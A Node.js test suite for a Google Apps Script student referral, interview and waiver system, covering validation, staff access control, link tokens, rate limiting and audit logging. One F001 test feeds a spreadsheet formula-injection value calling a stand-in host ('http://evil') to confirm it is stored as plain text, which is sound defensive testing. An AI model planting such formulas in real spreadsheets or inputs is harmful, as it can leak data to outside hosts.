/*
 * Test suite: runs the real Apps Script code against the in-memory mock.
 * Usage: node tests/run.js
 */
'use strict';
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const { makeWorld, loadProject } = require('./gas-mock');

const ROOT = path.join(__dirname, '..');
const read = p => fs.readFileSync(path.join(ROOT, p), 'utf8');
const plain = x => JSON.parse(JSON.stringify(x));
const same = (a, b, m) => assert.deepStrictEqual(plain(a), plain(b), m);
let passed = 0;
const failures = [];
function test(name, fn) {
  try { fn(); passed++; console.log('  ok   ' + name); }
  catch (e) { failures.push(name); console.log('  FAIL ' + name + '\n       ' + (e && e.stack || e).split('\n').slice(0, 3).join('\n       ')); }
}

/* ---------- consistency between files ---------- */
console.log('Consistency');
test('Schema.gs is identical in both Apps Script projects', () => {
  assert.strictEqual(read('apps-script/intake/Schema.gs'), read('apps-script/staff-panel/Schema.gs'));
});
test('the paste ready files in apps-script/paste are up to date', () => {
  const files = require('../tools/build-apps-script').build();
  Object.keys(files).forEach(f => assert.strictEqual(read('apps-script/paste/' + f), files[f], f + ' is stale: run node tools/build-apps-script.js'));
  assert.ok(!/<\?!=/.test(files['Panel.html']), 'Panel.html has no include left');
});
test('staff panel F003Sheet.html is the same code as docs/assets/js/f003-sheet.js', () => {
  const html = read('apps-script/staff-panel/F003Sheet.html').trim();
  assert.strictEqual(html, '<script>\n' + read('docs/assets/js/f003-sheet.js') + '</script>');
});

const world0 = makeWorld();
const IEO = loadProject(path.join(ROOT, 'apps-script/intake'), world0).ctx.IEO;
const decode = s => s.replace(/&amp;/g, '&').replace(/&quot;/g, '"').replace(/&lt;/g, '<').replace(/&rsquo;/g, '’');
function values(file, name) {
  const html = read('docs/' + file);
  const re = new RegExp('name="' + name + '"[^>]*value="([^"]*)"|value="([^"]*)"[^>]*name="' + name + '"', 'g');
  const out = []; let m;
  while ((m = re.exec(html))) out.push(decode(m[1] || m[2]));
  return out;
}
function options(file, selectId) {
  const html = read('docs/' + file);
  const sel = new RegExp('<select[^>]*id="' + selectId + '"[\\s\\S]*?</select>').exec(html)[0];
  return [...sel.matchAll(/<option value="([^"]+)"/g)].map(m => decode(m[1]));
}
test('F001 reasons, sources and sex match the schema', () => {
  same(values('f001.html', 'reasons'), IEO.REFERRAL_REASONS);
  same(options('f001.html', 'r_source'), IEO.REFERRAL_SOURCES);
  same(values('f001.html', 's_sex'), IEO.SEX);
});
test('F002 IP groups, disabilities, sex and semesters match the schema', () => {
  same(values('f002.html', 'ip_groups'), IEO.IP_GROUPS);
  same(values('f002.html', 'disabilities'), IEO.DISABILITIES);
  same(values('f002.html', 'sex'), IEO.SEX);
  same(options('f002.html', 'semester'), IEO.SEMESTERS);
});
test('F003 professions and requested documents match the schema', () => {
  same(values('f003.html', 'to_profession'), IEO.PROFESSIONS);
  same(values('f003.html', 'docs_requested'), IEO.F003_DOCS);
});
test('every form page shows the RA 10173 data privacy consent', () => {
  ['f001.html', 'f002.html', 'f003.html'].forEach(f => assert.ok(/data-consent="consent"/.test(read('docs/' + f)), f));
  assert.ok(read('docs/assets/js/common.js').includes('Data Privacy Act of 2012'));
  assert.ok(read('docs/f002.html').includes('data-consent'), 'F002 consent');
});
test('the public site holds no student data files', () => {
  const walk = d => fs.readdirSync(d, { withFileTypes: true }).flatMap(e => e.isDirectory() ? walk(path.join(d, e.name)) : [path.join(d, e.name)]);
  const bad = walk(path.join(ROOT, 'docs')).filter(f => /\.(csv|xlsx?|json|docx?|pdf)$/i.test(f));
  same(bad, []);
});

/* ---------- backend behaviour ---------- */
const world = makeWorld();
const intake = loadProject(path.join(ROOT, 'apps-script/intake'), world);
const STAFF = 'case.manager@rtu.edu.ph';
const staff = loadProject(path.join(ROOT, 'apps-script/staff-panel'), world, { email: STAFF });
const I = intake.ctx, S = staff.ctx;

const sheetId = I.setup();
staff.props.SHEET_ID = sheetId;
staff.props.STAFF_EMAILS = 'director@rtu.edu.ph, ' + STAFF.toUpperCase();
staff.props.SITE_URL = 'https://example.github.io/rtu-ieo-intake';
const ss = world.SpreadsheetApp.openById(sheetId);
const rows = tab => S.ieoReadAll_(tab);

function post(action, data, token, extra) {
  const body = Object.assign({ action, data, token }, extra || {});
  return JSON.parse(I.doPost({ postData: { contents: JSON.stringify(body) } }).getContent());
}
function status(token) { return JSON.parse(I.doGet({ parameter: { action: 'status', t: token } }).getContent()); }
const tokenOf = link => /#t=([a-f0-9]{64})$/.exec(link)[1];

const futureDay = new Date(Date.now() + 8 * 3600000 + 3 * 86400000).toISOString().slice(0, 10);
const SCHED = { date: futureDay, start: '09:00', end: '10:00', mode: 'In person', venue: '', send_email: false, send_invite: false };
const F001 = {
  s_name: 'Dela Cruz, Juan Santos', s_program: 'BS Electronics Engineering', s_department: 'CEIT', s_student_no: '2026-100234', s_email: 'Juan.DelaCruz@rtu.edu.ph',
  s_birthday: '2007-03-14', s_age: '19', s_sex: 'Male', reasons: ['Academic Challenged', 'Others'], reason_other: 'Frequent absences',
  r_name: 'Maria Reyes', r_contact: '09171234567', r_department: 'CEIT', r_email: 'mreyes@rtu.edu.ph', r_designation: 'Instructor',
  r_source: 'Faculty', observations: 'Has trouble reading the board.', attest_name: 'maria  reyes', client_datetime: 'today', consent: true
};

console.log('Setup');
test('setup() creates every tab with its headers', () => {
  Object.keys(IEO.SHEETS).forEach(n => {
    const sh = ss.getSheetByName(n);
    assert.ok(sh, n);
    same(sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0], IEO.SHEETS[n]);
  });
  assert.strictEqual(ss.getSheetByName('Sheet1'), null);
});
test('setup() can run twice safely', () => { assert.strictEqual(I.setup(), sheetId); });
test('setup() makes the account that runs it the alert recipient', () => {
  assert.strictEqual(intake.props.ALERT_EMAILS, 'ieo.owner@gmail.com');
});

console.log('F001 Referral Slip (public)');
let caseId;
test('a valid referral creates a case and returns only a reference number', () => {
  const r = post('submit_f001', F001);
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  assert.match(r.ref, /^IEO-\d{4}-0001$/);
  same(Object.keys(r).sort(), ['ok', 'ref', 'submittedAt']);
  caseId = r.ref;
  const c = rows('Cases')[0];
  assert.strictEqual(c.stage, 'RECEIVED');
  assert.strictEqual(c.student_no, '2026-100234');
  assert.strictEqual(rows('F001_Referrals')[0].r_contact, '09171234567', 'leading zero kept');
  assert.strictEqual(rows('F001_Referrals')[0].reasons, 'Academic Challenged; Others');
});
test('a new referral emails the IEO alert list without student details', () => {
  const m = world.mail.filter(x => /New referral slip/.test(x.subject));
  assert.strictEqual(m.length, 1);
  assert.strictEqual(m[0].to, 'ieo.owner@gmail.com');
  assert.ok(m[0].body.includes(caseId));
  ['Dela Cruz', 'Juan', 'Maria Reyes', '0917', 'read the board'].forEach(t => assert.ok(!m[0].body.includes(t) && !m[0].subject.includes(t), 'leaks ' + t));
});
test('a failed alert email does not lose the referral', () => {
  world.failMail = true;
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'Mail Fail' }));
  world.failMail = false;
  assert.strictEqual(r.ok, true);
});
test('the student email is required, checked, and saved on the case', () => {
  assert.ok(post('submit_f001', Object.assign({}, F001, { s_email: 'not-an-email' })).fields.s_email);
  assert.strictEqual(rows('Cases')[0].student_email, 'juan.delacruz@rtu.edu.ph');
  assert.strictEqual(S.getCase(caseId).suggestedStudentEmail, 'juan.delacruz@rtu.edu.ph');
});
test('an older spreadsheet without the new columns is upgraded automatically', () => {
  const sh = ss.getSheetByName('F001_Referrals');
  const col = sh.data[0].indexOf('s_email');
  sh.data.forEach(r => r.splice(col, 1));
  assert.strictEqual(post('submit_f001', Object.assign({}, F001, { s_name: 'Upgrade Test' })).ok, true);
  assert.strictEqual(rows('F001_Referrals').pop().s_email, 'Juan.DelaCruz@rtu.edu.ph');
});
test('case numbers count up', () => {
  assert.match(post('submit_f001', Object.assign({}, F001, { s_name: 'Second Student' })).ref, /-0004$/);
});
test('missing required answers come back as field errors', () => {
  const r = post('submit_f001', { consent: true });
  assert.strictEqual(r.ok, false);
  ['s_name', 's_program', 's_department', 's_email', 'reasons', 'r_name', 'r_source', 'attest_name', 'r_contact'].forEach(k => assert.ok(r.fields[k], k));
});
test('consent is required', () => {
  assert.ok(post('submit_f001', Object.assign({}, F001, { consent: false })).fields.consent);
});
test('the typed signature must match the referring person', () => {
  assert.ok(post('submit_f001', Object.assign({}, F001, { attest_name: 'Someone Else' })).fields.attest_name);
});
test('options outside the original form are rejected', () => {
  const r = post('submit_f001', Object.assign({}, F001, { r_source: 'Hacker', reasons: ['Invented'] }));
  assert.ok(r.fields.r_source && r.fields.reasons);
});
test('"Others" source needs a specification', () => {
  assert.ok(post('submit_f001', Object.assign({}, F001, { r_source: 'Others' })).fields.r_source_other);
});
test('spreadsheet formulas typed into fields are stored as plain text', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: '=IMPORTXML("http://evil","//a")', observations: '+cmd', r_name: '@x', attest_name: '@x' }));
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  const last = rows('F001_Referrals').pop();
  assert.strictEqual(last.s_name, '=IMPORTXML("http://evil","//a")');
});
test('the honeypot field silently drops bots', () => {
  const before = rows('Cases').length;
  const r = post('submit_f001', F001, null, { website: 'http://spam' });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(rows('Cases').length, before);
});
test('very long input is cut to the field limit', () => {
  post('submit_f001', Object.assign({}, F001, { observations: 'x'.repeat(10000) }));
  assert.strictEqual(rows('F001_Referrals').pop().observations.length, 4000);
});

console.log('Staff panel access control');
test('a non-staff Google account gets the access denied page and no data', () => {
  staff.user.email = 'student@gmail.com';
  const html = S.doGet().getContent();
  assert.ok(/not on the staff list/.test(html));
  assert.ok(!html.includes('Dela Cruz'));
  ['listCases', 'getConfig'].forEach(fn => assert.throws(() => S[fn](), /Not authorized/));
  assert.throws(() => S.getCase(caseId), /Not authorized/);
  assert.throws(() => S.saveRiskNote(caseId, 'x'), /Not authorized/);
});
test('an anonymous visitor is denied', () => {
  staff.user.email = '';
  assert.throws(() => S.listCases(), /Not authorized/);
});
test('an allowlisted account (any letter case) gets the panel', () => {
  staff.user.email = STAFF;
  const html = S.doGet().getContent();
  assert.ok(html.includes('IEO staff panel') && html.includes('IEOF003Sheet'));
  assert.ok(S.listCases().length >= 3);
});
test('getCase never exposes the link hash', () => {
  assert.ok(!('link_hash' in S.getCase(caseId).caseRecord));
});

console.log('SOP workflow');
test('the interview cannot start before the risk and opportunity note', () => {
  assert.throws(() => S.proceedToInterview(caseId, SCHED), /risk and opportunity/);
});
test('save the risk and opportunity note', () => {
  assert.strictEqual(S.saveRiskNote(caseId, 'Risk: falling behind. Opportunity: early support.').ok, true);
});
test('the process may not push forward without the required documents', () => {
  S.saveDocuments(caseId, ['NEURODIVERGENT'], ['pwd_id']);
  assert.throws(() => S.proceedToInterview(caseId, SCHED), /may not push forward.*Clinical diagnosis/);
});
test('portfolio cannot be submitted before the interview stage', () => {
  assert.strictEqual(status('a'.repeat(64)).valid, false);
});
test('documents incomplete marks the case and allows F003 for neurodivergent cases', () => {
  S.markDocumentsPending(caseId);
  assert.strictEqual(rows('Cases')[0].stage, 'DOCS_PENDING');
  const rec = S.issueF003(caseId, { to_profession: 'Psychiatrist', to_name: 'Dr. Santos', docs_requested: [], issued_by: 'Case Manager' });
  assert.ok(rec.ok);
  same(rec.docs_requested, ['Clinical diagnosis'], 'clinical diagnosis always requested');
  assert.strictEqual(rows('F003_Referrals').length, 1);
  assert.strictEqual(Number(rows('Cases')[0].f003_issued_count), 1);
});
test('F003 is refused for IP or PDL cases (they submit the documents directly)', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'IP Student' }));
  S.saveRiskNote(r.ref, 'note');
  S.saveDocuments(r.ref, ['IP'], []);
  assert.throws(() => S.issueF003(r.ref, { to_profession: 'Physician' }), /F003 applies/);
});
test('IP needs a COC or a Tribal/Community Endorsement (either one)', () => {
  assert.strictEqual(S.ieoEvaluateDocuments_(['IP'], []).complete, false);
  assert.strictEqual(S.ieoEvaluateDocuments_(['IP'], ['tribal_endorsement']).complete, true);
  assert.strictEqual(S.ieoEvaluateDocuments_(['IP'], ['coc']).complete, true);
});
test('PDL needs both the BJMP endorsement and the CAWO clearance', () => {
  assert.strictEqual(S.ieoEvaluateDocuments_(['PDL'], ['bjmp_endorsement']).complete, false);
  assert.strictEqual(S.ieoEvaluateDocuments_(['PDL'], ['bjmp_endorsement', 'cawo_clearance']).complete, true);
});
test('several categories combine their requirements', () => {
  const ev = S.ieoEvaluateDocuments_(['PHYSICAL_SENSORY', 'IP'], ['clinical_dx']);
  assert.strictEqual(ev.complete, false);
  assert.strictEqual(S.ieoEvaluateDocuments_(['PHYSICAL_SENSORY', 'IP'], ['clinical_dx', 'coc']).complete, true);
});
test('no category means not complete', () => {
  assert.strictEqual(S.ieoEvaluateDocuments_([], ['clinical_dx']).complete, false);
});

let portfolioToken;
test('with the clinical diagnosis checked the interview opens and a link is issued', () => {
  S.saveDocuments(caseId, ['NEURODIVERGENT'], ['clinical_dx', 'pwd_id']);
  const r = S.proceedToInterview(caseId, Object.assign({}, SCHED, { student_email: 'juan@example.com', also_invite: 'casemanager2@rtu.edu.ph', send_email: true, send_invite: true }));
  assert.match(r.link, /^https:\/\/example\.github\.io\/rtu-ieo-intake\/f002\.html#t=[a-f0-9]{64}$/);
  portfolioToken = tokenOf(r.link);
  assert.strictEqual(rows('Cases')[0].stage, 'INTERVIEW');
  assert.notStrictEqual(rows('Cases')[0].link_hash, portfolioToken, 'only the hash is stored');
});
test('scheduling stores the interview, emails the student the schedule and link, and sends a calendar invite', () => {
  const c = rows('Cases')[0];
  assert.strictEqual(c.interview_start, futureDay + ' 09:00');
  assert.strictEqual(c.interview_venue, IEO.DEFAULT_VENUE);
  assert.strictEqual(c.student_email, 'juan@example.com');
  const m = world.mail.filter(x => x.to === 'juan@example.com').pop();
  assert.ok(m && /interview schedule/.test(m.subject));
  assert.ok(m.body.includes(portfolioToken), 'portfolio link in the email');
  assert.strictEqual(m.from, STAFF, 'sent from the staff account');
  const e = world.events[c.calendar_event_id];
  assert.ok(e, 'calendar event created');
  assert.ok(!e.title.includes('Dela Cruz'), 'no name in the event title');
  assert.deepStrictEqual(e.guests, ['juan@example.com', 'casemanager2@rtu.edu.ph']);
  assert.strictEqual(e.start.toISOString(), new Date(futureDay + 'T09:00:00+08:00').toISOString());
});
test('schedule checks: past date, end before start, online needs a link, email needed to notify', () => {
  const base = { start: '09:00', end: '10:00', mode: 'In person' };
  assert.throws(() => S.parseSchedule_(Object.assign({ date: '2020-01-01' }, base)), /past/);
  assert.throws(() => S.parseSchedule_({ date: futureDay, start: '10:00', end: '09:00' }), /after the start/);
  assert.throws(() => S.parseSchedule_({ date: futureDay, start: '09:00', end: '10:00', mode: 'Online', venue: 'room 1' }), /meeting link/);
  assert.throws(() => S.parseSchedule_(Object.assign({ date: futureDay, send_invite: true }, base)), /student email/);
});
test('rescheduling moves the same calendar event and emails the new schedule without a new link', () => {
  const before = rows('Cases')[0].calendar_event_id;
  S.rescheduleInterview(caseId, { date: futureDay, start: '13:00', end: '14:30', mode: 'Online', venue: 'https://meet.google.com/abc-defg-hij', student_email: 'juan@example.com', send_email: true, send_invite: true });
  const c = rows('Cases')[0];
  assert.strictEqual(c.calendar_event_id, before, 'same event');
  assert.strictEqual(world.events[before].start.toISOString(), new Date(futureDay + 'T13:00:00+08:00').toISOString());
  assert.strictEqual(world.events[before].guests.length, 2, 'no duplicate guests');
  const m = world.mail.filter(x => x.to === 'juan@example.com').pop();
  assert.ok(/moved/.test(m.subject) && !/#t=/.test(m.body));
  assert.strictEqual(c.interview_mode, 'Online');
});
test('a calendar problem is reported but does not block scheduling', () => {
  staff.props.CALENDAR_ID = 'ieo@group.calendar.google.com';
  world.sharedCalendars = { 'ieo@group.calendar.google.com': ['someone.else@rtu.edu.ph'] };
  const r = S.rescheduleInterview(caseId, Object.assign({}, SCHED, { student_email: 'juan@example.com', send_invite: true }));
  assert.ok(r.ok && !r.eventCreated && /calendar invite could not be sent/.test(r.warnings[0]));
  world.sharedCalendars['ieo@group.calendar.google.com'].push(STAFF);
  const r2 = S.rescheduleInterview(caseId, Object.assign({}, SCHED, { student_email: 'juan@example.com', send_invite: true }));
  assert.ok(r2.eventCreated, 'shared IEO calendar used when CALENDAR_ID is set and shared');
  delete staff.props.CALENDAR_ID;
});
test('upcoming interviews show in the case list', () => {
  assert.ok(S.listCases().some(c => c.case_id === caseId && c.interview_start === futureDay + ' 09:00'));
});
test('documents are locked after the interview opens', () => {
  assert.throws(() => S.saveDocuments(caseId, ['NEURODIVERGENT'], []), /before the interview/);
});
test('the link status reveals no personal data', () => {
  const s = status(portfolioToken);
  same(s, { ok: true, valid: true, portfolioOpen: true, waiverOpen: false });
  same(status('not-a-token'), { ok: true, valid: false });
});

const F002 = {
  course: 'BSECE', last_name: 'Dela Cruz', first_name: 'Juan', middle_name: 'Santos', nickname: 'Jun',
  present_address: 'Mandaluyong City', provincial_address: '', age: '19', sex: 'Male', civil_status: 'Single', religion: '',
  nationality: 'Filipino', telephone: '', mobile: '09181234567', email: 'juan@example.com', pwd_id: '',
  ip_member: 'Yes', ip_groups: ['Ifugao', 'Others'], ip_other: 'Kalinga',
  emergency_name: 'Ana Dela Cruz', emergency_relationship: 'Mother', emergency_address: 'Mandaluyong', emergency_contact: '09190000000',
  elem_school: 'X Elementary', elem_year: '2019', jhs_school: 'Y High', jhs_year: '2023', shs_school: 'Z SHS', shs_year: '2025', shs_track: 'Academic', shs_strand: 'STEM',
  disabilities: ['Learning Disability (e.g. Dyslexia, Dyscalculia, Dysgraphia)', 'Others'], disability_other: 'ADHD',
  medications: 'None', precautions: 'Seat near the front',
  photo_note_ack: true, disclaimer_ack: true, consent: true, signature_name: 'Juan Santos Dela Cruz'
};
test('a portfolio without a valid link is refused', () => {
  assert.match(post('submit_f002', F002, 'b'.repeat(64)).error, /not valid/);
  assert.match(post('submit_f002', F002, undefined).error, /not valid/);
});
test('portfolio validation: IP group needed when Yes, Others needs text, acknowledgements needed', () => {
  const r = post('submit_f002', Object.assign({}, F002, { ip_groups: [], disability_other: '', disclaimer_ack: false, photo_note_ack: false }), portfolioToken);
  assert.ok(r.fields.ip_groups && r.fields.disability_other && r.fields.disclaimer_ack && r.fields.photo_note_ack);
});
test('the waiver cannot be signed before the decision', () => {
  assert.match(post('submit_waiver', { waiver_name: 'Juan', ay_start: '2026', ay_end: '2027', semester: '1st', signature_name: 'Juan', consent: true }, portfolioToken).error, /waiver is not open/);
});
test('a valid portfolio is saved once', () => {
  const r = post('submit_f002', F002, portfolioToken);
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  assert.ok(world.mail.some(x => /Student portfolio submitted/.test(x.subject) && x.subject.includes(caseId)), 'staff alerted');
  const p = rows('F002_Portfolios')[0];
  assert.strictEqual(p.ip_groups, 'Ifugao; Others');
  assert.strictEqual(rows('Cases')[0].stage, 'PORTFOLIO_SUBMITTED');
  assert.match(post('submit_f002', F002, portfolioToken).error, /already been submitted/);
  assert.strictEqual(status(portfolioToken).portfolioOpen, false);
});
test('sessions and case notes are staff only and saved', () => {
  S.saveSession(caseId, { session: 'Intake', date: '2026-10-20', time_started: '09:00', time_ended: '10:00', attended_by: 'Case Manager' });
  S.saveSession(caseId, { session: 'Intake', date: '2026-10-21', time_started: '09:30', time_ended: '10:00', attended_by: 'Case Manager' });
  assert.strictEqual(rows('Sessions').length, 1, 'same session updates in place');
  assert.strictEqual(rows('Sessions')[0].date, '2026-10-21');
  assert.throws(() => S.saveSession(caseId, { session: 'Session 99' }), /Unknown session/);
  S.addCaseNote(caseId, 'Discussed reading support.');
  assert.strictEqual(S.getCase(caseId).notes[0].author, STAFF);
});
let waiverToken;
test('"No educational assistance needed" unlocks the waiver and retires the portfolio link', () => {
  const r = S.recordDecision(caseId, false);
  waiverToken = tokenOf(r.link);
  assert.strictEqual(rows('Cases')[0].stage, 'WAIVER_PENDING');
  assert.strictEqual(status(portfolioToken).valid, false);
  same(status(waiverToken), { ok: true, valid: true, portfolioOpen: false, waiverOpen: true });
});
test('waiver checks: academic year runs one year, signature matches name', () => {
  const r = post('submit_waiver', { waiver_name: 'Juan Dela Cruz', ay_start: '2026', ay_end: '2028', semester: '1st', signature_name: 'J D C', consent: true }, waiverToken);
  assert.ok(r.fields.ay_end && r.fields.signature_name);
});
test('the waiver is signed and the link stops working', () => {
  const r = post('submit_waiver', { waiver_name: 'Juan Dela Cruz', ay_start: '2026', ay_end: '2027', semester: '1st', signature_name: 'Juan Dela Cruz', consent: true }, waiverToken);
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  assert.strictEqual(rows('Cases')[0].stage, 'WAIVER_SIGNED');
  assert.strictEqual(status(waiverToken).valid, false);
});
test('the case closes at End of Process', () => {
  S.closeCase(caseId, '');
  const c = rows('Cases')[0];
  assert.strictEqual(c.stage, 'CLOSED');
  assert.strictEqual(c.close_reason, 'Completed');
});
test('"Yes" goes to ISP (SOP-OVPAA-IEO-02) without a waiver', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'ISP Student' }));
  S.saveRiskNote(r.ref, 'note');
  S.saveDocuments(r.ref, ['PDL'], ['bjmp_endorsement', 'cawo_clearance']);
  const t = tokenOf(S.proceedToInterview(r.ref, SCHED).link);
  assert.strictEqual(post('submit_f002', Object.assign({}, F002, { ip_member: 'No' }), t).ok, true);
  S.recordDecision(r.ref, true);
  const c = S.ieoFindCase_(r.ref);
  assert.strictEqual(c.stage, 'ISP');
  assert.match(c.decision, /SOP-OVPAA-IEO-02/);
  assert.throws(() => S.reissueLink(r.ref), /only used while waiting/);
});
test('reissuing a link invalidates the old one', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'Reissue Student' }));
  S.saveRiskNote(r.ref, 'note');
  S.saveDocuments(r.ref, ['IP'], ['coc']);
  const t1 = tokenOf(S.proceedToInterview(r.ref, SCHED).link);
  const t2 = tokenOf(S.reissueLink(r.ref).link);
  assert.strictEqual(status(t1).valid, false);
  assert.strictEqual(status(t2).portfolioOpen, true);
});
test('expired links are refused', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'Old Link' }));
  S.saveRiskNote(r.ref, 'note');
  S.saveDocuments(r.ref, ['IP'], ['coc']);
  const t = tokenOf(S.proceedToInterview(r.ref, SCHED).link);
  const c = S.ieoFindCase_(r.ref);
  S.ieoUpdate_('Cases', c._row, { link_issued_at: '2020-01-01 00:00:00' });
  assert.strictEqual(status(t).valid, false);
  assert.match(post('submit_f002', F002, t).error, /expired/);
});
test('closing early needs a reason, and cancels a future interview invite', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'Withdrawn' }));
  assert.throws(() => S.closeCase(r.ref, ''), /reason/);
  S.saveRiskNote(r.ref, 'note');
  S.saveDocuments(r.ref, ['IP'], ['coc']);
  S.proceedToInterview(r.ref, Object.assign({}, SCHED, { student_email: 'w@example.com', send_invite: true }));
  const evId = S.ieoFindCase_(r.ref).calendar_event_id;
  S.closeCase(r.ref, 'Student withdrew');
  assert.strictEqual(S.ieoFindCase_(r.ref).stage, 'CLOSED');
  assert.strictEqual(world.events[evId].deleted, true);
});
test('every staff action is in the audit log with the staff email', () => {
  const log = rows('AuditLog');
  ['F001_SUBMITTED', 'RISK_NOTE_SAVED', 'DOCUMENTS_UPDATED', 'F003_ISSUED', 'INTERVIEW_SCHEDULED', 'F002_SUBMITTED', 'DECISION_RECORDED', 'WAIVER_SIGNED', 'CASE_CLOSED', 'CASE_VIEWED']
    .forEach(a => assert.ok(log.some(l => l.action === a), a));
  assert.ok(log.filter(l => l.action === 'CASE_VIEWED').every(l => l.actor === STAFF));
});

console.log('F003 (public form)');
test('F003 is recorded and linked to an existing case', () => {
  const before = Number(S.ieoFindCase_(caseId).f003_issued_count);
  const r = post('submit_f003', { case_id: caseId, date_issued: '2026-10-20', to_profession: 'Psychologist', s_name: 'Juan', s_program: 'BSECE', docs_requested: ['Clinical diagnosis'], issued_by: 'Staff', consent: true });
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  assert.match(r.ref, /^F003-/);
  assert.strictEqual(Number(S.ieoFindCase_(caseId).f003_issued_count), before + 1);
});
test('F003 response is the same whether or not the case exists', () => {
  const r = post('submit_f003', { case_id: 'IEO-2026-9999', date_issued: '2026-10-20', to_profession: 'Physician', s_name: 'X', s_program: 'Y', docs_requested: ['Clinical diagnosis'], issued_by: 'Z', consent: true });
  same(Object.keys(r).sort(), ['ok', 'ref', 'submittedAt']);
});

console.log('Flood guard');
test('submissions above the per minute limit are refused', () => {
  Object.keys(intake.cache).forEach(k => delete intake.cache[k]);
  let last;
  for (let i = 0; i < IEO.MAX_SUBMISSIONS_PER_MINUTE + 1; i++) last = post('submit_f001', { consent: false });
  assert.match(last.error, /Many forms/);
  Object.keys(intake.cache).forEach(k => delete intake.cache[k]);
});

console.log('\n' + passed + ' passed, ' + failures.length + ' failed');
if (failures.length) process.exit(1);
